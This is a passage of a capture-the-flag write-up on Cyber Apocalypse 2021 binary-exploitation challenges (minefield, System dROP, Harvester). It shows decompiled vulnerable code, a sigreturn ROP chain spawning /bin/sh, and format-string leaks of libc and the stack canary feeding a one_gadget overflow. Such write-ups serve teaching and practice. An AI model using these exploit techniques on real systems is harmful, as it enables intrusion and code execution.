&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>r</span>(nptr);
+</span></span><span style=display:flex><span>target_addr <span style=color:#f92672>=</span> (_QWORD <span style=color:#f92672>*</span>)<span style=color:#a6e22e>strtoull</span>(nptr, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Insert location to plant: &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>r</span>(target_value);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;We need to get out of here as soon as possible. Run!&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>target_addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtoull</span>(target_value, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>0</span>);
+</span></span></code></pre></div><p>We do not have the libc for this challenge but we have a win function named <code>_</code> at address <code>0x40096B</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>v0 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Mission accomplished! ✔</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Mission accomplished! ✔</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, v0);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;cat flag*&#34;</span>);
+</span></span></code></pre></div><p>Note that the same write-what-where vulnerability is used in the challenge <a href=#save-the-environment---difficulty-24>Save the environment</a>.</p><h3 id=exploitation-1>Exploitation</h3><p>Protections are as follow:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;minefield&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    No RELRO
+</span></span><span style=display:flex><span>    Stack:    Canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>The binary is not PIE so ALSR is not a problem here. A leak is not needed to exploit this binary.</p><p>We have all elements but it remains to know what to overwrite to win. We choose to overwrite the function pointer present in the <code>.fini_array</code> section. This function pointer is called at the end of the execution. This pointer is at address <code>0x601078</code>.</p><p>Finally the exploit is really simple:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png alt=fig_controller_minefield></a></p><h2 id=system-drop---difficulty-14>System dROP - Difficulty 1/4</h2><p><em>Challenge files: <a href=/posts/binaries/Cyber_Apocalypse_2021/pwn_system_drop.zip>pwn_system_drop.zip</a></em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/user/Apocalypse/system-drop/system_drop&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
+</span></span><span style=display:flex><span>    Stack:    No canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p><code>No PIE</code> and <code>No canary found</code> suggest a stack overflow. However the binary is <em>very</em> small.</p><h3 id=the-vulnerability>The vulnerability</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>32</span>]; <span style=color:#75715e>// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>alarm</span>(<span style=color:#ae81ff>0xFu</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x100uLL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>A stack overflow, clear and simple.</p><h3 id=attack-method-2>Attack method</h3><p>However, the binary is small and does not have any leak-friendly function.</p><pre tabindex=0><code>.text:0000000000400537 ; =============== S U B R O U T I N E ==================
+.text:0000000000400537
+.text:0000000000400537 ; Attributes: bp-based frame
+.text:0000000000400537
+.text:0000000000400537 ; __int64 syscall(__int64 sysno, ...)
+.text:0000000000400537                 public _syscall
+.text:0000000000400537 _syscall        proc near
+.text:0000000000400537 ; __unwind {
+.text:0000000000400537                 push    rbp
+.text:0000000000400538                 mov     rbp, rsp
+.text:000000000040053B                 syscall                 ; LINUX -
+.text:000000000040053D                 retn
+.text:000000000040053D _syscall        endp ; sp-analysis failed
+.text:000000000040053D
+.text:000000000040053D ; -------------------------------------------------------
+.text:000000000040053E                 db 90h
+.text:000000000040053F ; -------------------------------------------------------
+.text:000000000040053F                 pop     rbp
+.text:0000000000400540                 retn
+.text:0000000000400540 ; } // starts at 400537
+.text:0000000000400541
+.text:0000000000400541 ; =============== S U B R O U T I N E ===================
+.text:0000000000400541
+.text:0000000000400541 ; Attributes: bp-based frame
+.text:0000000000400541
+.text:0000000000400541 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:0000000000400541                 public main
+.text:0000000000400541 main            proc near
+.text:0000000000400541
+.text:0000000000400541 buf             = byte ptr -20h
+.text:0000000000400541
+.text:0000000000400541 ; __unwind {
+.text:0000000000400541                 push    rbp
+.text:0000000000400542                 mov     rbp, rsp
+.text:0000000000400545                 sub     rsp, 20h
+.text:0000000000400549                 mov     edi, 0Fh        ; seconds
+.text:000000000040054E                 call    _alarm
+.text:0000000000400553                 lea     rax, [rbp+buf]
+.text:0000000000400557                 mov     edx, 100h       ; nbytes
+.text:000000000040055C                 mov     rsi, rax        ; buf
+.text:000000000040055F                 mov     edi, 0          ; fd
+.text:0000000000400564                 call    _read
+.text:0000000000400569                 mov     eax, 1
+.text:000000000040056E                 leave
+.text:000000000040056F                 retn
+.text:000000000040056F ; } // starts at 400541
+.text:000000000040056F main            endp
+</code></pre><p>The function at <code>0x400537</code> is a gift ! We have a raw syscall instruction. However, to have control over the syscall, we first need to control <code>rax</code>, and no gadget allows us to control <code>rax</code> trivially, apart from <code>0x400569</code> which allows to set <code>eax=1</code>.</p><p><code>sigreturn</code> is a nice system call in this case, which will read cpu context from the stack, consequently allowing us to control all the registers. The syscall number associated with it is <code>0xf</code>. So we are looking at setting <code>eax=0xf</code>.</p><p>Reading the alarm manpage is rather interesting:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>ALARM</span>(<span style=color:#ae81ff>2</span>)                   Linux Programmer<span style=color:#960050;background-color:#1e0010>&#39;</span>s Manual                  <span style=color:#a6e22e>ALARM</span>(<span style=color:#ae81ff>2</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>NAME
+</span></span><span style=display:flex><span>       alarm <span style=color:#f92672>-</span> set an alarm clock <span style=color:#66d9ef>for</span> delivery of a signal
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>RETURN VALUE
+</span></span><span style=display:flex><span>       <span style=color:#a6e22e>alarm</span>() returns the number of seconds remaining  until  any  previously
+</span></span><span style=display:flex><span>       scheduled alarm was due to be delivered, or zero <span style=color:#66d9ef>if</span> there was no previ<span style=color:#960050;background-color:#1e0010>‐</span>
+</span></span><span style=display:flex><span>       ously scheduled alarm.
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>For this challenge, calling <code>alarm()</code> will set the alarm to fire later, and a nice side-effect, will also set <code>eax</code> to the remaining number of seconds until the scheduled alarm fires. Thus calling <code>alarm()</code> sets <code>eax=0xf</code>, which is what we wanted.</p><p>We will go for a <code>sigreturn</code>, and cook the stack for it to work correctly:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> SigreturnFrame, constants
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p, elf, libc):
+</span></span><span style=display:flex><span>	stack_base <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601800</span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> p64(stack_base) <span style=color:#75715e># rbp</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e># 0x00000000004005d1 : pop rsi ; pop r15 ; ret</span>
+</span></span><span style=display:flex><span>	gadget_pop_rsi_r15 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4005d1</span>
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rsi_r15) <span style=color:#f92672>+</span> p64(stack_base) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e># 0x0000000000400564 : call read</span>
+</span></span><span style=display:flex><span>	call_read <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400564</span>
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> p64(call_read) <span style=color:#f92672>+</span> p64(stack_base) 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e># Pad for reach end of first read</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span> len(ropchain) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>256</span>:
+</span></span><span style=display:flex><span>	  ropchain <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Z&#39;</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>assert</span>(len(ropchain) <span style=color:#f92672>==</span> <span style=color:#ae81ff>256</span>)
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#75715e># Send cmd into the stack with read</span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e># just before addr used to continue the ROP</span>
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#75715e># Rop continuation</span>
+</span></span><span style=display:flex><span>	syscall_inst <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40053b</span>
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> p64(elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;alarm&#39;</span>])
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> p64(syscall_inst)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	frame     <span style=color:#f92672>=</span> SigreturnFrame()
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>rax <span style=color:#f92672>=</span> constants<span style=color:#f92672>.</span>SYS_execve
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>rdi <span style=color:#f92672>=</span> stack_base
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>rsi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>rdx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>r8  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>rsp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601000</span>
+</span></span><span style=display:flex><span>	frame<span style=color:#f92672>.</span>rip <span style=color:#f92672>=</span> syscall_inst
+</span></span><span style=display:flex><span>	ropchain <span style=color:#f92672>+=</span> bytes(frame)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	p<span style=color:#f92672>.</span>send(ropchain)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><p>The magic shell is coming:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-system_drop_win.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-system_drop_win.png alt=fig_system_drop_win></a></p><h2 id=harvester---difficulty-24>Harvester - Difficulty 2/4</h2><p><em>Challenge files: <a href=/posts/binaries/Cyber_Apocalypse_2021/pwn_harvester.zip>pwn_harvester.zip</a></em></p><p>The <code>harvester</code> is a 64bits ELF that allows to perform some actions:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-harvester.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-harvester.png alt=fig_harvester></a></p><p>The libc used by the binary is provided with this challenge.</p><h3 id=attack-method-3>Attack method</h3><p>Protections are as follow:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;harvester&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Full RELRO
+</span></span><span style=display:flex><span>    Stack:    Canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      PIE enabled
+</span></span></code></pre></div><h4 id=harvest-information-required-to-bypass-aslr-and-stack-cookie>Harvest information required to bypass ASLR and stack cookie</h4><p>We will use the format string vulnerability in <code>fight</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Choose weapon:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[1] 🗡</span><span style=color:#ae81ff>\t\t</span><span style=color:#e6db74>[2] 💣</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[3] 🏹</span><span style=color:#ae81ff>\t\t</span><span style=color:#e6db74>[4] 🔫</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, weapon, <span style=color:#ae81ff>5uLL</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Your choice is: &#34;</span>); 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)weapon);
+</span></span></code></pre></div><ul><li><code>%3$p</code>: will leak a libc address, thereby bypassing libc ASLR</li><li><code>%15$p</code>: will leak the stack cookie, thereby bypassing stack protection</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%3$p&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Your choice is: (0x[a-fA-F0-9]+)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, data)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>(m)
+</span></span><span style=display:flex><span>    libc_leak <span style=color:#f92672>=</span> int(m<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    libc_base <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0xe4774</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>((libc_base <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfff</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%15$p&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Your choice is: (0x[a-fA-F0-9]+00)&#39;</span>, data)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>(m)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    cookie <span style=color:#f92672>=</span> int(m<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>0</span>)
+</span></span></code></pre></div><h4 id=stack-overflow>Stack overflow</h4><p>There is a stack overflow in <code>stare</code>, however, to trigger it we need to have 22 pies:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// stare
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>40</span>]; <span style=color:#75715e>// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>[...]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[+] You found 1 </span><span style=color:#ae81ff>\u1F96</span><span style=color:#e6db74>7!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#f92672>++</span>pie <span style=color:#f92672>==</span> <span style=color:#ae81ff>22</span> )
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1B</span><span style=color:#e6db74>[1;32m&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You also notice that if the Harvester eats too many pies, it falls asleep.&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Do you want to feed it?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x40uLL</span>); <span style=color:#75715e>// Overflow !
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1B</span><span style=color:#e6db74>[1;31m&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>This did not work as planned..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We do have a way to increment pies one by one using <code>stare</code>, but then the program will stop when reaching 16 pies:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>check_pie</span>(<span style=color:#66d9ef>int</span> pie)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  [...]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1B</span><span style=color:#e6db74>[1;31m&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( pie <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span> )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printstr</span>(<span style=color:#f92672>&amp;</span>unk_1090);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( pie <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span> <span style=color:#f92672>||</span> pie <span style=color:#f92672>==</span> <span style=color:#ae81ff>15</span> )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printstr</span>(<span style=color:#f92672>&amp;</span>unk_10A4);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Once this requirement will be satisfied, everything will be ready to make an effective stack overflow, as we have libc addresses and the stack cookie.</p><h4 id=stealing-pies>Stealing pies</h4><p>The last function to use is <code>inventory</code>, which we can use to leave items from our stuff. However, we can specify a negative integer, which will cause the inventory to be incremented, and not decremented as planned.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>How many do you want to drop?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>v1);
+</span></span><span style=display:flex><span>pie <span style=color:#f92672>-=</span> v1;
+</span></span></code></pre></div><p>The exploit code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;y&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-11&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span></code></pre></div><p>On the next call to <code>stare</code>, the count of pies will reach 22, which will trigger the stack overflow.</p><h3 id=exploitation-2>Exploitation</h3><p>The last step is to find a one_gadget that works with our constraints, and build the stack payload to overwrite the legitimate stack and gain a shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    one_gadget <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4f3d5</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> flat({
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>40</span>: p64(cookie),
+</span></span><span style=display:flex><span>      <span style=color:#ae81ff>56</span>: p64(libc_base <span style=color:#f92672>+</span> one_gadget),
+</span></span><span style=display:flex><span>    }, length<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span>, filler<span style=color:#f92672>=</span>cyclic(<span style=color:#ae81ff>64</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>send(ropchain)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><p>Put it all together:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> flat, cyclic
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p, elf, libc):
+</span></span><span style=display:flex><span>
